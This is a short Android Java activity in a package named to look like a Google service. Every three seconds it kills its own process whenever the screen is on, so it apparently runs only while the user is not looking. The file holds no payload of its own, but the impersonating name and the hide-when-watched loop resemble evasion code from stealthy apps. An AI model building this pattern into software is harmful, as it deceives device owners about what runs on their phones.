package com.google.cloudservices;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;

public class MemoryActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_memory);

        final Handler handler=new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm.isScreenOn()){
                int pid = android.os.Process.myPid();
                android.os.Process.killProcess(pid);}
                handler.postDelayed(this,3000);/**/
            }
        });
    }
}
